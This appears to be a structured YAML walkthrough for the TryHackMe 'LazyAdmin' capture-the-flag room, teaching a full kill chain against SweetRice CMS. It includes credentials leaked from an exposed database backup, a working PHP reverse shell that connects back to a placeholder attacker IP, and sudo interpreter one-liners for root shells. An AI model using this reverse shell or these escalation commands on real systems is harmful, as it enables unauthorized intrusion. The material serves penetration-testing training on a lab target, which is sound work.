id: thm-lazyadmin
platform: tryhackme
name: "LazyAdmin"
url: https://tryhackme.com/room/lazyadmin
difficulty: easy
estimated_time: 60

skills:
  - nmap-basics
  - web-enumeration
  - directory-fuzzing
  - cms-exploitation
  - sudo-privesc

prerequisites:
  rooms: []
  skills: []

brief: |
  Linear easy box. Apache web server on port 80 running SweetRice CMS.
  Default Apache page at root — real content at /content/. MySQL backup
  exposed at /content/inc/mysql_backup/ contains admin creds (manager/Password123).
  Login at /content/as/, upload PHP reverse shell via ad code editor.
  www-data shell. sudo -l reveals perl and a backup.pl script run as root
  with NOPASSWD. sudo perl for root shell. Flags at /home/itguy/user.txt
  and /root/root.txt. No rabbit holes, clean kill chain.

questions:
  - id: q1
    text: "What is the user flag?"
    answer_step: user-flag
  - id: q2
    text: "What is the root flag?"
    answer_step: root-flag

phases:
  - id: recon
    name: "Initial Reconnaissance"
    objective: "Discover what's running on the target"
    steps:
      - id: port-scan
        narration: |
          First thing we always do — figure out what's running on this box.
          I'm going to run an nmap scan with version detection and default scripts.
        command: "nmap -sV -sC {target}"
        explanation: |
          -sV detects service versions (what software and what version).
          -sC runs nmap's default scripts — they check for common misconfigs and info leaks.
          This is your bread and butter scan. You'll run this on every single target.
        look_for:
          - "Port 22 SSH — note the OpenSSH version (tells us it's Ubuntu)"
          - "Port 80 HTTP — Apache web server, this is our entry point"
          - "Only 2 ports — simple attack surface, web server is the way in"
        key_takeaway: |
          Web servers on port 80/443 are almost always the entry point in CTF boxes.
          When you see HTTP, your next thought should be: what's on this website?
        if_fails: |
          0 hosts up means VPN isn't connected or the target isn't running.
          Check: ip a show tun0 (VPN up?), ping -c 1 {target} (reachable?).
          If filtered, try: nmap -Pn {target} to skip host discovery.
        resources:
          - title: "Nmap Basics — Alien37 Guide"
            url: "https://alien37.com/docs/nmap-basics"
            description: "Nmap flags, scan types, and how to read output"
        conversation: "What do you notice about those two services? Anything jump out?"

  - id: web-enum
    name: "Web Enumeration"
    objective: "Find what's hiding on the web server"
    steps:
      - id: check-homepage
        narration: |
          Let's see what's on the web server. Quick curl to grab the homepage.
        command: "curl -s http://{target}/ | head -20"
        explanation: |
          curl fetches web pages from the command line. -s is silent mode (no progress bar).
          We pipe to head -20 to see the first 20 lines — enough to get a feel.
        look_for:
          - "Default Apache 'It works!' page or Ubuntu default page"
          - "No custom content at root — real app is in a subdirectory"
        key_takeaway: |
          Default pages mean the real content is hiding in subdirectories.
          When you see a default page, your next move is directory brute-forcing.
        if_fails: |
          Connection refused means the web server isn't running or wrong port.
          Try: curl -v http://{target}/ to see more details.

      - id: dir-fuzz
        narration: |
          Default page means hidden directories. Let's brute-force with gobuster.
          This throws a wordlist of common directory names at the server.
        command: "gobuster dir -u http://{target}/ -w /usr/share/wordlists/dirb/common.txt -q"
        explanation: |
          gobuster dir = directory mode.
          -u is the target URL. -w is the wordlist (dirb/common.txt has ~4600 entries).
          -q is quiet mode so we just see the hits.
          Other tools: ffuf, dirbuster, feroxbuster — they all do the same thing.
        look_for:
          - "/content/ directory — this is where the CMS lives"
          - "Any other directories that might be interesting"
        key_takeaway: |
          Directory brute-forcing reveals what the surface doesn't show you.
          This is why enumeration matters — the homepage told us nothing,
          but gobuster found the actual application.
        if_fails: |
          If gobuster hangs or errors, check the URL is right (http not https).
          Try a smaller wordlist first: /usr/share/wordlists/dirb/small.txt
        conversation: "See how the default page was a dead end but gobuster found /content/? This is why enumeration matters."

      - id: identify-cms
        narration: |
          Let's look at /content/ and figure out what CMS is running.
        command: "curl -s http://{target}/content/ | head -30"
        explanation: |
          We're reading the HTML source. CMS software usually identifies itself
          in the page — look for generator meta tags, CSS paths, or JS includes.
        look_for:
          - "SweetRice — that's the CMS name"
          - "Any version numbers in the source"
          - "Links to /content/as/ (the admin panel)"
        key_takeaway: |
          When you find a CMS, always check for known exploits. Obscure CMS
          software is often poorly maintained and full of vulnerabilities.
        if_fails: |
          If empty, try without head: curl -s http://{target}/content/
          Or check in browser if curl isn't showing it right.

      - id: searchsploit
        narration: |
          Found a CMS — let's check if it has known vulnerabilities.
          searchsploit searches the Exploit-DB database offline.
        command: "searchsploit sweetrice"
        explanation: |
          searchsploit is a command-line search for Exploit-DB. Works offline.
          Always check this when you find named software with a version.
          You can also search on exploit-db.com or Google "sweetrice exploit".
        look_for:
          - "Backup Disclosure — this lets us find database backups"
          - "Arbitrary File Upload — this is how we'll get a shell later"
          - "Multiple exploits — SweetRice is full of holes"
        key_takeaway: |
          searchsploit is muscle memory. Find software → searchsploit it.
          Multiple exploit types means multiple attack paths.

  - id: exploitation
    name: "Exploitation"
    objective: "Find credentials and get a shell"
    steps:
      - id: deeper-enum
        narration: |
          Let's fuzz deeper inside /content/ to find CMS internals.
        command: "gobuster dir -u http://{target}/content/ -w /usr/share/wordlists/dirb/common.txt -q"
        explanation: |
          Same technique, but now fuzzing inside /content/ instead of root.
          Always fuzz recursively — directories inside directories.
        look_for:
          - "/content/inc/ — 'inc' usually holds includes, configs, backups"
          - "/content/as/ — the admin login panel"
          - "Any other directories worth investigating"
        key_takeaway: |
          Don't stop at the first level of fuzzing. Go deeper into
          interesting directories. The juicy stuff is often nested.

      - id: find-backup
        narration: |
          Let's check /content/inc/ — CMS internals often have exposed files.
        command: "curl -s http://{target}/content/inc/"
        explanation: |
          If the server shows directory listings instead of blocking access,
          you can browse everything inside. This is a misconfiguration.
        look_for:
          - "mysql_backup/ directory — database backups are a jackpot"
          - "Directory listing enabled — server misconfiguration"
          - "Any config files, .php files worth reading"
        key_takeaway: |
          Database backups in web-accessible directories are a critical
          misconfiguration. In real pentests, this is how you get credentials fast.
        resources:
          - title: "Web Enumeration — Alien37 Guide"
            url: "https://alien37.com/docs/web-enumeration"
            description: "Finding hidden files, directories, and misconfigurations"
        conversation: "Database backups in a public directory — that's a serious finding. Why is this so dangerous?"

      - id: grab-creds
        narration: |
          Let's download and read that MySQL backup. Database dumps
          almost always contain usernames and passwords.
        command: "curl -s http://{target}/content/inc/mysql_backup/ && echo '---' && curl -s http://{target}/content/inc/mysql_backup/*.sql | grep -i 'pass\\|admin'"
        explanation: |
          We're listing the backup directory then grepping the SQL dump for passwords.
          grep -i makes it case-insensitive. Looking for 'pass' or 'admin' strings.
          In a real engagement, download the whole file and read it carefully.
        look_for:
          - "Admin username — likely 'manager'"
          - "Password hash or plaintext password"
          - "The password might be a simple MD5 — try cracking or just try it raw"
        key_takeaway: |
          Always read database dumps carefully. Credentials, emails, and
          configuration data are all valuable for the next phase of attack.

      - id: get-shell
        narration: |
          We have admin access to SweetRice. CMS admin panels almost always
          let you upload files or edit code. We're going to get a reverse shell.

          What's a reverse shell? Normally YOU connect to a server. A reverse
          shell flips that — the TARGET connects back to YOU. Why? Because
          firewalls usually block incoming connections but allow outgoing ones.
          The server "calls you back" and gives you a command line.

          Here's the plan:

          STEP 1 — Start a listener on YOUR machine (new terminal):
            nc -lvnp 4444
            (-l listen, -v verbose, -n no DNS, -p port)
            This sits and waits for the target to connect back.

          STEP 2 — Log into SweetRice at http://{target}/content/as/
            Use the creds we found: manager / Password123

          STEP 3 — Go to the Ads section and add a new ad.
            The ad editor lets you insert raw PHP code — that's our way in.

          STEP 4 — Paste this PHP reverse shell as the ad code:

            <?php
            set_time_limit(0);
            $ip = 'YOUR_VPN_IP';   // <-- change this to your tun0 IP
            $port = 4444;          // <-- must match your nc listener
            $sock = fsockopen($ip, $port);
            $proc = proc_open('/bin/sh', array(
                0 => $sock,   // stdin  — reads from your listener
                1 => $sock,   // stdout — sends output to you
                2 => $sock    // stderr — sends errors to you too
            ), $pipes);
            ?>

            How this works line by line:
            - set_time_limit(0) prevents PHP from killing the script
            - fsockopen() makes a TCP connection FROM the server TO you
            - proc_open() spawns /bin/sh and wires its input/output
              through that socket — so you type commands, the server runs
              them, and you see the output
            - The three array entries (0,1,2) are stdin, stdout, stderr —
              all pointed at the socket so everything flows through

            Find your VPN IP with: ip a show tun0

          STEP 5 — Save the ad, then visit the URL to trigger it:
            http://{target}/content/inc/ads/your_ad.php
            Check your nc listener — you should have a shell as www-data.
        command: null
        explanation: |
          Why this works: SweetRice's ad editor saves your input as a .php
          file in /content/inc/ads/. The web server executes any .php file
          when you visit it. So we write PHP code that connects back to us,
          visit the file, Apache runs it, and our listener catches the shell.

          The shell above is a minimal reverse shell. The full pentestmonkey
          version (see Resources) is more robust — it handles edge cases,
          upgrades the shell, and works on more systems. But the concept is
          identical: socket + shell process = remote command execution.

          You'll use this exact pattern over and over:
          1. Find somewhere you can upload/inject code
          2. Write code that connects back to your listener
          3. Trigger execution
          4. Catch the shell
        look_for:
          - "Connection received on nc listener"
          - "Shell as www-data (the web server user)"
        key_takeaway: |
          CMS admin panel → file upload or code injection → reverse shell.
          This pattern works on WordPress, Joomla, Drupal, and obscure
          CMS platforms. If you can upload and execute, you've got a shell.

          The core concept: any time you can make a server execute your code,
          you can get a shell. The code just needs to open a connection back
          to you and pipe a shell process through it.
        resources:
          - title: "Reverse Shells Deep Dive — Alien37"
            url: "https://alien37.com/docs/reverse-shells"
            description: "Different shell types, upgrading shells, and when to use each"
          - title: "pentestmonkey PHP reverse shell"
            url: "https://github.com/pentestmonkey/php-reverse-shell"
            description: "The full-featured PHP reverse shell with TTY handling and cleanup"
          - title: "RevShells Generator"
            url: "https://www.revshells.com"
            description: "Generate reverse shell one-liners for any language — just enter your IP and port"
        conversation: "This upload-to-shell pattern is one of the most common initial access methods. Where else might you find file upload functionality?"

  - id: privesc
    name: "Privilege Escalation"
    objective: "Go from www-data to root"
    steps:
      - id: check-sudo
        narration: |
          First thing after getting a shell — check what we can run with sudo.
          This is always step one for Linux privilege escalation.
        command: "sudo -l"
        explanation: |
          sudo -l lists what commands the current user can run as other users.
          NOPASSWD means no password required — instant win if exploitable.
          This should be muscle memory: get shell -> sudo -l.
        look_for:
          - "NOPASSWD entries — commands we can run as root without a password"
          - "/usr/bin/perl — an interpreter we can run as root"
          - "A backup script — might be writable or call something we control"
        key_takeaway: |
          sudo -l is THE first command after getting a shell. If you can
          run an interpreter (perl, python, ruby, vim) as root, game over.
        resources:
          - title: "GTFOBins"
            url: "https://gtfobins.github.io"
            description: "Curated list of Unix binaries that can be exploited for privilege escalation"
          - title: "Linux Privilege Escalation — Alien37 Guide"
            url: "https://alien37.com/docs/linux-privesc"
            description: "sudo, SUID, cron, and other Linux privesc techniques"
        conversation: "Check GTFOBins for perl — it lists exactly how to exploit it. What other binaries on that list have you seen before?"

      - id: get-root
        narration: |
          Perl can execute system commands. Since we can run it as root,
          we just tell it to spawn a bash shell. One command, instant root.
        command: "sudo perl -e 'exec \"/bin/bash\"'"
        explanation: |
          perl -e runs a one-liner. exec() replaces the perl process with bash.
          Since sudo runs perl as root, the bash shell is also root.

          Other interpreters that work the same way:
          - Python: sudo python -c 'import os; os.system("/bin/bash")'
          - Ruby: sudo ruby -e 'exec "/bin/bash"'
          - Vim: sudo vim -c '!bash'
        look_for:
          - "root@... prompt — we're root"
          - "id command should show uid=0(root)"
        key_takeaway: |
          Any interpreter with sudo = root shell. Memorize the GTFOBins
          entries for perl, python, ruby, vim, less, more, find, nmap.

      - id: user-flag
        narration: |
          We're root. Let's grab the user flag first.
        command: "cat /home/itguy/user.txt"
        explanation: |
          User flags are typically in the user's home directory.
        look_for:
          - "The flag hash — copy this for the THM question"
        key_takeaway: |
          Always grab both flags. User flag proves initial access,
          root flag proves full compromise.
        answers: ["q1"]

      - id: root-flag
        narration: |
          And the root flag.
        command: "cat /root/root.txt"
        explanation: |
          Root flag is in /root/ — only readable by root.
        look_for:
          - "The flag hash — this completes the room"
        key_takeaway: |
          Box owned. Full kill chain: recon -> enumerate -> exploit -> escalate.
        answers: ["q2"]

completion:
  flags:
    - name: "user.txt"
      location: "/home/itguy/user.txt"
    - name: "root.txt"
      location: "/root/root.txt"
  skills_earned:
    - nmap-basics
    - web-enumeration
    - directory-fuzzing
    - cms-exploitation
    - sudo-privesc

walkthrough_notes: |
  Linear easy room. Good first room for teaching the full pipeline:
  nmap -> curl -> gobuster -> searchsploit -> find creds -> upload shell -> sudo privesc
  No rabbit holes. SweetRice CMS with MySQL backup containing plaintext creds.
  PHP file upload for shell. sudo perl for root. Clean path.
